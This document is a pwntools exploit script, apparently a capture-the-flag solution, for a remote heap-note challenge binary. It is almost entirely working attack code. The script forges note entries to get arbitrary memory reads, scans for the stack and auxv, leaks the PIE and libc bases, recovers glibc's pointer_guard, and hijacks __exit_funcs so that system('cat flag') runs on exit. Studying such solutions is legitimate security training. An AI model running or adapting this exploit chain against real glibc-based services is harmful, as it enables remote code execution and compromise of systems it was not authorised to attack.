from pwn import *

import argparse
import math
import struct
import time


context.arch = "amd64"
context.log_level = "info"

elf = ELF("./prob", checksec=False)

HOST = "chall.blackpinker.com"
PORT = 20767

PROMPT = b"cmd > "
BAD_ADDR = 0x414141414141

NOTES_PER_BOOK = 48
SLOTS_PER_GROUP = 23
SCAN_GROUPS = 10

STACK_SCAN_LO = 0x7FFC00000000
STACK_SCAN_HI = 0x800000000000
STACK_SCAN_STRIDE = 0x20000
STACK_REFINE_LO = 0x40000
STACK_REFINE_HI = 0x50000
PAGE = 0x1000
LEAK_CHUNK = 0x100

LIBC_WRITE_OFFSET = 0x11C590
LIBC_SYSTEM_OFFSET = 0x58750
LIBC_EXIT_FUNCS_OFFSET = 0x203680
LIBC_INIT_PTR_CHUNK = 0x200

CAGE_DTOR_OFFSET = 0x4A6C
REMAINDER_CHUNK_SIZE = 0x180

BOOKS_OFFSET = elf.symbols["books"]
WRITE_GOT_OFFSET = elf.got["write"]


def p64s(*xs):
    return b"".join(p64(x) for x in xs)


def rol64(x, r):
    return ((x << r) | (x >> (64 - r))) & ((1 << 64) - 1)


def ror64(x, r):
    return ((x >> r) | ((x & ((1 << r) - 1)) << (64 - r))) & ((1 << 64) - 1)


def unpack_qword(data):
    return struct.unpack("<Q", data)[0]


def chunked(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i : i + n]


class Group:
    def __init__(self, group_id):
        self.group_id = group_id
        self.book_idx = group_id + 1
        self.base_slot = group_id * 4
        self.writer_slot = self.base_slot
        self.guard_slot = self.base_slot + 3


class Exploit:
    def __init__(self, io):
        self.io = io
        self.groups = [Group(i) for i in range(SCAN_GROUPS)]
        self.prompt = PROMPT
        self.io.recvuntil(self.prompt)

    def recv_n_prompts(self, count):
        data = b""
        while data.count(self.prompt) < count:
            chunk = self.io.recv(timeout=10)
            if not chunk:
                raise EOFError("connection closed while waiting for prompts")
            data += chunk
        return data

    def cmd(self, c):
        self.io.sendline(str(c).encode())

    def switch(self, idx):
        self.cmd(0)
        self.io.recvuntil(b"Book: ")
        self.io.sendline(str(idx).encode())
        self.io.recvuntil(self.prompt)

    def write_note(self, slot, size, data, wait_prompt=True):
        self.cmd(1)
        self.io.recvuntil(b"slot: ")
        self.io.sendline(str(slot).encode())
        self.io.recvuntil(b"size: ")
        self.io.sendline(str(size).encode())
        self.io.recvuntil(b"data: ")
        self.io.send(data)
        if wait_prompt:
            self.io.recvuntil(self.prompt)

    def erase(self, slot):
        self.cmd(3)
        self.io.recvuntil(b"slot: ")
        self.io.sendline(str(slot).encode())
        self.io.recvuntil(self.prompt)

    def raw_erase_and_write(self, slot, size, payload):
        self.io.send(
            b"3\n"
            + str(slot).encode()
            + b"\n1\n"
            + str(slot).encode()
            + b"\n"
            + str(size).encode()
            + b"\n"
        )
        self.io.recvuntil(b"data: ")
        self.io.send(payload)
        self.io.recvuntil(self.prompt)

    def read_raw(self, slot):
        self.cmd(2)
        self.io.recvuntil(b"slot: ")
        self.io.sendline(str(slot).encode())
        return self.io.recvuntil(self.prompt)

    def read_menu_batch(self, groups):
        transcript = b""
        for group in groups:
            transcript += b"0\n" + str(group.book_idx).encode() + b"\n"
            for slot in range(SLOTS_PER_GROUP):
                transcript += b"2\n" + str(slot).encode() + b"\n"

        self.io.send(transcript)
        data = self.recv_n_prompts(len(groups) * (SLOTS_PER_GROUP + 1))
        parts = data.split(self.prompt)

        cursor = 0
        out = {}
        for group in groups:
            cursor += 1
            slot_out = []
            for _ in range(SLOTS_PER_GROUP):
                part = parts[cursor]
                cursor += 1
                if b"slot: " in part:
                    part = part.split(b"slot: ", 1)[1]
                slot_out.append(part)
            out[group.group_id] = slot_out
        return out

    @staticmethod
    def parse_read_part(part):
        if not part.endswith(b"\n"):
            raise ValueError(f"unexpected read part: {part!r}")
        return part[:-1]

    def writer_payload(self, pairs, prefix_patches=None):
        payload = bytearray(b"\x00" * 0x2F0)
        if prefix_patches:
            for off, blob in prefix_patches:
                payload[off : off + len(blob)] = blob

        pos = 0x180
        padded_pairs = list(pairs[:SLOTS_PER_GROUP])
        while len(padded_pairs) < SLOTS_PER_GROUP:
            padded_pairs.append((1, BAD_ADDR))

        for size, addr in padded_pairs:
            payload[pos : pos + 0x10] = p64s(size, addr)
            pos += 0x10
        return bytes(payload)

    def setup_group(self, group):
        log.info("setup group %d -> book %d", group.group_id, group.book_idx)
        self.switch(0)
        self.write_note(group.base_slot + 0, 0x170, b"A")
        self.write_note(group.base_slot + 1, 0x170, b"B")
        self.write_note(group.base_slot + 2, 0x2F0, b"C")
        self.write_note(group.base_slot + 3, 0xF0, b"D")
        self.erase(group.base_slot + 1)
        self.erase(group.base_slot + 0)
        self.erase(group.base_slot + 2)
        self.switch(group.book_idx)
        self.switch(0)
        self.write_note(group.writer_slot, 0x2F0, self.writer_payload([]))

    def setup_scan_groups(self):
        for group in self.groups:
            self.setup_group(group)

    def reload_groups(self, group_to_pairs):
        self.switch(0)
        for group in group_to_pairs:
            payload = self.writer_payload(group_to_pairs[group])
            self.raw_erase_and_write(group.writer_slot, 0x2F0, payload)

    def leak_specs(self, specs, groups=None):
        if groups is None:
            groups = self.groups
        outputs = []
        cap = len(groups) * SLOTS_PER_GROUP

        for spec_batch in chunked(specs, cap):
            used_groups = groups[: math.ceil(len(spec_batch) / SLOTS_PER_GROUP)]
            mapping = {}
            idx = 0
            for group in used_groups:
                mapping[group] = spec_batch[idx : idx + SLOTS_PER_GROUP]
                idx += SLOTS_PER_GROUP

            self.reload_groups(mapping)
            batch_reads = self.read_menu_batch(used_groups)

            remaining = len(spec_batch)
            for group in used_groups:
                for slot in range(min(SLOTS_PER_GROUP, remaining)):
                    raw = self.parse_read_part(batch_reads[group.group_id][slot])
                    outputs.append(raw)
                remaining -= SLOTS_PER_GROUP
        return outputs

    def leak(self, addr, size, groups=None):
        specs = []
        off = 0
        while off < size:
            take = min(LEAK_CHUNK, size - off)
            specs.append((take, addr + off))
            off += take
        return b"".join(self.leak_specs(specs, groups=groups))

    def leak_qword(self, addr, groups=None):
        return unpack_qword(self.leak(addr, 8, groups=groups))

    def find_elf_base(self, any_ptr, groups=None, max_back=0x400000):
        if groups is None:
            groups = [self.groups[0]]

        start = any_ptr & ~(PAGE - 1)
        pages = []
        for off in range(0, max_back + PAGE, PAGE):
            pages.append(start - off)

        for batch in chunked(pages, len(groups) * SLOTS_PER_GROUP):
            specs = [(4, page) for page in batch]
            raws = self.leak_specs(specs, groups=groups)
            for page, raw in zip(batch, raws):
                if raw == b"\x7fELF":
                    return page
        raise RuntimeError(f"ELF base not found near {any_ptr:#x}")

    def probe_readable(self, addrs):
        specs = [(1, addr) for addr in addrs]
        raw = self.leak_specs(specs)
        return [len(x) == 1 for x in raw]

    def find_stack_anchor(self):
        cur = STACK_SCAN_HI - PAGE
        batch = 0
        started = time.time()

        while cur >= STACK_SCAN_LO:
            addrs = []
            for _ in range(len(self.groups) * SLOTS_PER_GROUP):
                if cur < STACK_SCAN_LO:
                    break
                addrs.append(cur)
                cur -= STACK_SCAN_STRIDE

            hits = self.probe_readable(addrs)
            for addr, ok in zip(addrs, hits):
                if ok:
                    log.success("stack anchor at %#x", addr)
                    return addr

            batch += 1
            if batch % 16 == 0:
                done = (STACK_SCAN_HI - PAGE) - cur
                total = STACK_SCAN_HI - STACK_SCAN_LO
                pct = 100.0 * done / total
                log.info(
                    "stack scan: %.2f%% (%#x left), elapsed %.1fs",
                    pct,
                    cur,
                    time.time() - started,
                )

        raise RuntimeError("stack anchor not found")

    def refine_stack_mapping(self, anchor):
        lo = (anchor - STACK_REFINE_LO) & ~(PAGE - 1)
        hi = (anchor + STACK_REFINE_HI) & ~(PAGE - 1)
        pages = list(range(lo, hi, PAGE))
        readable = self.probe_readable(pages)
        hit_pages = [p for p, ok in zip(pages, readable) if ok]
        if not hit_pages:
            raise RuntimeError("refine failed: no readable pages")

        best = []
        cur = []
        for page in hit_pages:
            if cur and page == cur[-1] + PAGE:
                cur.append(page)
            else:
                if len(cur) > len(best):
                    best = cur
                cur = [page]
        if len(cur) > len(best):
            best = cur

        start = best[0]
        end = best[-1] + PAGE
        log.success("stack mapping %#x - %#x", start, end)
        return start, end

    def dump_stack(self, stack_lo, stack_hi):
        specs = []
        addr = stack_lo
        while addr < stack_hi:
            specs.append((LEAK_CHUNK, addr))
            addr += LEAK_CHUNK
        chunks = self.leak_specs(specs)
        return b"".join(chunks)

    def find_auxv_and_pie(self, stack_blob):
        e_phoff = elf.header.e_phoff

        for off in range(0, len(stack_blob) - 0x80, 8):
            seen = {}
            pairs = []
            j = off
            while j + 0x10 <= len(stack_blob):
                typ = unpack_qword(stack_blob[j : j + 8])
                val = unpack_qword(stack_blob[j + 8 : j + 0x10])
                pairs.append((typ, val))
                j += 0x10
                if typ == 0:
                    break
                if typ > 0x1000:
                    break
                seen[typ] = val

            if not pairs or pairs[-1][0] != 0 or 3 not in seen:
                continue

            pie = seen[3] - e_phoff
            if pie & 0xFFF:
                continue
            if self.leak(pie, 4, groups=[self.groups[0]]) != b"\x7fELF":
                continue

            log.success("PIE base %#x", pie)
            return pie, seen

        raise RuntimeError("failed to parse auxv / PIE")

    def recover_pointer_guard(self, pie, libc_base):
        exit_funcs_ptr = self.leak_qword(libc_base + LIBC_EXIT_FUNCS_OFFSET, groups=[self.groups[0]])
        init_blob = self.leak(exit_funcs_ptr, LIBC_INIT_PTR_CHUNK, groups=[self.groups[0]])
        idx = unpack_qword(init_blob[8:16])

        for i in range(idx):
            base = 0x10 + i * 0x20
            if base + 0x20 > len(init_blob):
                break
            flavor, mangled, arg, dso = struct.unpack("<QQQQ", init_blob[base : base + 0x20])
            if flavor != 4:
                continue
            if pie <= arg < pie + 0x20000 or pie <= dso < pie + 0x20000:
                guard = ror64(mangled, 17) ^ (pie + CAGE_DTOR_OFFSET)
                log.success("pointer_guard %#x", guard)
                return guard

        raise RuntimeError("failed to recover pointer_guard")

    def final_overwrite(self, pie, libc_base, pointer_guard):
        book0 = self.leak_qword(pie + BOOKS_OFFSET, groups=[self.groups[0]])
        writer = self.leak_qword(book0 + 0x8, groups=[self.groups[0]])

        log.info("book0 %#x", book0)
        log.info("writer %#x", writer)

        filler0 = 40
        filler1 = 41
        split_slot = 42
        overwrite_slot = 43

        self.switch(0)
        self.write_note(filler0, 0x4000, b"E")
        self.write_note(filler1, 0x4000, b"F")

        filler1_ptr = self.leak_qword(book0 + filler1 * 0x10 + 0x8, groups=[self.groups[0]])
        fake_list = writer + 0x20
        cmd_str = writer + 0x60
        fake_hdr = writer + 0x100
        fake_pay = fake_hdr + 0x10
        fake_safe_size = (filler1_ptr - 0x10) - fake_hdr

        if fake_safe_size < 0x4000:
            raise RuntimeError("fake chunk safe size too small")

        system = libc_base + LIBC_SYSTEM_OFFSET

        stage1_prefix = [
            (0x20, p64s(0, 1, 4, rol64(system ^ pointer_guard, 17), cmd_str, 0)),
            (0x60, b"cat flag\x00"),
            (0x100, p64s(0, fake_safe_size | 1)),
        ]
        stage1_pairs = [(8, fake_pay)]

        self.switch(0)
        self.raw_erase_and_write(self.groups[0].writer_slot, 0x2F0, self.writer_payload(stage1_pairs, stage1_prefix))

        self.switch(self.groups[0].book_idx)
        self.erase(0)

        split_size = (libc_base + LIBC_EXIT_FUNCS_OFFSET - 0x10) - fake_hdr
        fake_final_size = split_size + REMAINDER_CHUNK_SIZE

        stage2_prefix = [
            (0x20, p64s(0, 1, 4, rol64(system ^ pointer_guard, 17), cmd_str, 0)),
            (0x60, b"cat flag\x00"),
            (0x100, p64s(0, fake_final_size | 1)),
        ]

        self.switch(0)
        self.raw_erase_and_write(self.groups[0].writer_slot, 0x2F0, self.writer_payload([], stage2_prefix))

        huge_req = split_size - 0x10
        self.write_note(split_slot, huge_req, b"Z")
        self.write_note(overwrite_slot, 0x170, p64(fake_list))

        log.success("__exit_funcs overwritten -> %#x", fake_list)

    def solve(self):
        self.setup_scan_groups()

        anchor = self.find_stack_anchor()
        stack_lo, stack_hi = self.refine_stack_mapping(anchor)
        stack_blob = self.dump_stack(stack_lo, stack_hi)
        pie, _ = self.find_auxv_and_pie(stack_blob)

        write_addr = self.leak_qword(pie + WRITE_GOT_OFFSET, groups=[self.groups[0]])
        libc_base = self.find_elf_base(write_addr, groups=[self.groups[0]])
        log.success("libc base %#x", libc_base)

        pointer_guard = self.recover_pointer_guard(pie, libc_base)
        self.final_overwrite(pie, libc_base, pointer_guard)

        self.cmd(6)
        return self.io.recvall(timeout=5)


def start_remote(host, port):
    return remote(host, port)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    args = parser.parse_args()

    io = start_remote(args.host, args.port)
    exp = Exploit(io)
    out = exp.solve()
    if out:
        try:
            print(out.decode("utf-8", "ignore"))
        except Exception:
            print(repr(out))


if __name__ == "__main__":
    main()
